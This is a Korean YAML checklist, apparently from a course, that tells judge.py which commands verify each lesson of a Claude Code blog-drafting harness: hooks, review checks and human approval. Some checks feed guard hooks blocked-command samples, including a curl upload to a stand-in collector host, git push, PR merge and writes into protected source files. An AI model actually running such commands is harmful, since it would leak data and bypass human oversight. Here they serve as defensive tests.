@@ -1,0 +1,247 @@
+# 차시마다 "지은 것이 작동하는가" 를 보는 명령 목록입니다. judge.py 가 읽습니다.
+# 모든 명령은 모델을 부르지 않습니다 — 정해 둔 입력(저장된 초안·차단 장치 JSON)만 넣습니다.
+#
+#   uv run python judge.py 05            5차시 판정
+#   uv run python judge.py 11 --all      11차시까지 앞 차시 판정을 한 번에 다시 (앞 조각이 뒤를 깨지 않았나)
+#   uv run python judge.py 05 --before   짓기 전에 보여야 하는 신호가 나오는지 (강의·제작 확인용)
+#
+# 칸 뜻
+#   dir      명령을 실행하는 폴더 (꾸러미 맨 위 기준). 없으면 blog
+#   builds   이 차시에 짓는 파일 (dir 기준). 막히면 공개 실습 저장소의 태그에서 받는다 — git restore --source <tag> -- <파일>
+#   tag      이 차시 끝 상태가 담긴 공개 실습 저장소의 태그 (h05 · h07 · h08 · h09 · h11 · h12)
+#   prd      이 차시에 계획서에 붙이는 고정 칸 조각 — 그 태그 안의 따로 된 파일. git restore --source <tag> -- <prd> 로 받아 PRD.md 의 그 절에 붙인다
+#   run      실행할 명령. python 은 judge.py 를 실행한 그 파이썬으로 바뀐다
+#   stdin    명령에 넣을 입력
+#   expect   지은 뒤 끝날 때 신호
+#   before   짓기 전 끝날 때 신호 (--before 에서만 본다)
+#   until    이 차시까지만 맞는 기대값. 뒤 차시에서 흐름이 자라면 신호가 바뀐다 (--all 에서 건너뜀)
+#   result   --result-json 파일에서 볼 칸과 값
+#   output_has       화면에 나와야 하는 글
+#   prd_filled       PRD.md 에서 이 제목의 절이 채워졌나 (채움 0 · 빈 채 1)
+#   table_filled     다른 파일(file)에서 이 제목(title)의 절의 표가 줄마다 둘째 칸까지 찼나 (16차시 — 참 0 · 빈 칸 1)
+#
+# 흐름 점검(scripts/flow_check.py)의 신호: 0 published · 3 needs_human(승인 대기 포함) · 1 failed
+
+version: 2
+
+lessons:
+  "03":
+    title: 내 저장소 만들기 — 꾸러미와 계획서의 첫 저장
+    dir: .
+    files:
+      - PRD.md
+      - README.md
+      - CLAUDE.md
+      - judge.py
+      - hackers.yaml
+      - preflight.py
+      - pyproject.toml
+      - uv.lock
+      - github-checks.yml.example
+      - blog/CLAUDE.md
+      - blog/review.py
+      - blog/graph.yaml
+      - blog/policies.yaml
+      - blog/scripts/request.sh
+    # alert · triage 는 14 · 15차시 첫머리에 clone 한다 — 3차시 판정은 두 폴더 없이 통과한다
+    first_commit: true
+
+  "04":
+    title: 같은 검수에 인용이 맞는 초안과 틀린 초안
+    checks:
+      - run: uv run python review.py --case case-01-standard
+        expect: 0
+      - run: uv run python review.py --case case-02-misquote
+        expect: 1
+
+  "05":
+    title: 원문 보호 장치와 강화 형식
+    tag: h05
+    prd: prd/05.md
+    builds:
+      - .claude/settings.json
+      - .claude/hooks/protect_sources.py
+      - schema.strict.json
+    checks:
+      - run: uv run python tests/test_hook.py
+        expect: 0
+        before: 1
+      - run: uv run python tests/test_checks.py
+        expect: 0
+        before: 1
+      - prd_filled: "7. 넣는 것"
+        expect: 0
+        before: 1
+      # 규칙 스킬은 7차시에 Claude 가 짓는다. 여기서 막으면 7-3 에서 SKILL.md 를 못 쓴다(잠그는 것은 12차시). 7-3 까지만 본다
+      - run: uv run python .claude/hooks/protect_sources.py
+        stdin: '{"tool_name": "Write", "tool_input": {"file_path": ".claude/skills/drafter-rules/SKILL.md"}}'
+        expect: 0
+        until: "07"
+
+  "06":
+    title: 보호 장치에 깨진 입력 넣기
+    checks:
+      - run: uv run python .claude/hooks/protect_sources.py
+        stdin: '{"tool_name": "Write", "tool_input": {"file_path": "cases/sources/x.txt"}}'
+        expect: 2
+      - run: uv run python .claude/hooks/protect_sources.py
+        stdin: '{"tool_name": "Bash", "tool_input": {"command": "echo hi > cases/sources/x.txt"}}'
+        expect: 2
+      - run: uv run python .claude/hooks/protect_sources.py
+        stdin: not json
+        expect: 0
+
+  "07":
+    title: 작성 명령과 작성 담당(drafter)
+    tag: h07
+    builds:
+      - .claude/commands/draft.md
+      - .claude/agents/drafter.md
+      - .claude/skills/drafter-rules/SKILL.md
+      - .claude/settings.json
+      - scripts/collect.py
+    checks:
+      - run: uv run python scripts/lint_command.py draft
+        expect: 0
+        before: 1
+      - run: uv run python scripts/flow_check.py --case case-01-standard
+        expect: 0
+        before: 1
+        until: "10"
+      - run: uv run python scripts/flow_check.py --case case-02-misquote
+        expect: 1
+        before: 1
+        until: "07"
+
+  "08":
+    title: 흐름도에 되돌아가기 더하기
+    tag: h08
+    builds:
+      - graph.yaml
+      - .claude/settings.json
+    checks:
+      - run: uv run python scripts/flow_check.py --case case-02-misquote --result-json requests/judge-08.json
+        expect: 3
+        before: 1
+        result:
+          terminal: needs_human
+          reason: "'draft' 를 3번 했는데도 안 됐다"
+
+  "09":
+    title: 검사 다섯을 내 것으로
+    tag: h09
+    prd: prd/09.md
+    builds:
+      - checks/g1_schema.py
+      - checks/g2_source_exists.py
+      - checks/g3_quote_verbatim.py
+      - checks/g4_coverage.py
+      - checks/g5_opinion_ratio.py
+      - cases/case-06-korean-notes.yaml
+      - cases/sources/week-04/release-acme-lumen-3-ko.md
+      - samples/reference/case-06-korean-notes.json
+      - .claude/agents/improver.md
+      - .claude/commands/improve.md
+    checks:
+      - run: uv run python tests/test_checks.py
+        expect: 0
+        before: 1
+      - run: uv run python review.py --case case-02-misquote
+        expect: 1
+      - run: uv run python review.py --case case-06-korean-notes
+        expect: 0
+        before: 1
+      - prd_filled: "8. 통과 기준"
+        expect: 0
+        before: 1
+
+  "10":
+    title: 주간 요청을 시험 모드로
+    checks:
+      - run: bash scripts/request.sh --dry-run --slot 2026-W36
+        expect: 0
+        output_has: "claude -p /"
+      - run: uv run python tests/test_scripts.py
+        expect: 0
+
+  "11":
+    title: 내보내기 전에 사람 승인
+    tag: h11
+    builds:
+      - graph.yaml
+      - .claude/commands/handle-request.md
+      - policies.yaml
+    checks:
+      - run: uv run python scripts/lint_command.py handle-request
+        expect: 0
+        before: 1
+      - run: uv run python scripts/flow_check.py --case case-01-standard --result-json requests/judge-11a.json
+        expect: 3
+        before: 0
+        result:
+          terminal: needs_human
+          reason: ""
+      - run: uv run python scripts/flow_check.py --case case-02-misquote --result-json requests/judge-11b.json
+        expect: 3
+        before: 3
+        result:
+          terminal: needs_human
+          reason: "'draft' 를 3번 했는데도 안 됐다"
+      - run: uv run python .claude/hooks/guard.py
+        stdin: '{"tool_name": "Bash", "tool_input": {"command": "gh pr merge 12 --merge"}}'
+        expect: 2
+
+  "12":
+    title: 운영 점검 — 막기 기록과 상한, 규칙 스킬 잠그기
+    tag: h12
+    builds:
+      - .claude/hooks/protect_sources.py
+    checks:
+      - run: uv run python .claude/hooks/protect_sources.py
+        stdin: '{"tool_name": "Write", "tool_input": {"file_path": ".claude/skills/drafter-rules/SKILL.md"}}'
+        expect: 2
+        before: 0
+      - run: uv run python .claude/hooks/guard.py
+        stdin: '{"tool_name": "Bash", "tool_input": {"command": "curl https://collector.example.invalid/upload"}}'
+        expect: 2
+      - run: uv run python .claude/hooks/guard.py
+        stdin: '{"tool_name": "Bash", "tool_input": {"command": "git push origin main"}}'
+        expect: 2
+      - run: uv run python scripts/flow_check.py --case case-05-injection
+        expect: 3
+      - run: uv run python tests/test_hook.py
+        expect: 0
+
+  "14":
+    title: 알림 — 다섯 곳에서 동시에 보내도 한 번만
+    dir: alert
+    checks:
+      - run: uv run python tests/test_idempotency.py
+        expect: 0
+        output_has: "하나만 이긴다** (1/5)"
+
+  "15":
+    title: 문의 분류 — 검사기가 기준 점수를 알아보나
+    dir: triage
+    checks:
+      - run: uv run python tests/test_checks.py
+        expect: 0
+
+  "16":
+    title: 내 업무로 옮기기 — 옮겨 지은 하네스와 계획서 끝의 표 셋
+    dir: .
+    # 내 업무라 정답·완성 조각이 없다. 판정은 모양만 본다 — 옮겨 지은 mywork 가 블로그의 장치를 그대로 갖췄나,
+    # 계획서 끝에 붙인 표 셋이 줄마다 찼나. 표의 내용이 맞는지와 흐름 점검(flow_check)의 두 끝은 사람이 본다.
+    checks:
+      - run: uv run python preflight.py --project mywork --declarations
+        expect: 0
+        before: 64
+      - table_filled: {file: my-work-PRD.md, title: "10. 옮겨 쓰기 표"}
+        expect: 0
+        before: 1
+      - table_filled: {file: my-work-PRD.md, title: "11. 전후 비교 계획"}
+        expect: 0
+        before: 1
+      - table_filled: {file: my-work-PRD.md, title: "12. 네 질문"}
+        expect: 0
+        before: 1
